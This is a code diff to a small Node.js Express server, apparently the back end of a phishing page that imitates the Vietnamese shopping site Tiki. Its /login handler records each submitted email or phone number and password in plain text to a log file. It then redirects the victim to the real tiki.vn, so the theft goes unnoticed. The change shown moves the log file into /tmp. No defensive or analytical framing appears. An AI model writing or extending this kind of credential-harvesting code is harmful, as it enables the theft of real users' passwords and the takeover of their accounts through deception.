@@ -5,6 +5,7 @@ const path = require("path");
 
 const app = express();
 const port = 3000;
+const logFilePath = path.join("/tmp", "login_data.txt");
 
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
@@ -22,12 +23,11 @@ app.post("/login", (req, res) => {
 
   const logData = `Email/Số điện thoại: ${emailOrPhone}\nMật khẩu: ${password}\n-----------------------------\n`;
 
-  fs.appendFile("login_data.txt", logData, (err) => {
+  fs.appendFile(logFilePath, logData, (err) => {
     if (err) {
       console.error("Lỗi khi lưu thông tin:", err);
       return res.status(500).json({ success: false, message: "Lỗi server." });
     }
-
     res.json({
       success: true,
       redirectUrl: "https://tiki.vn/",
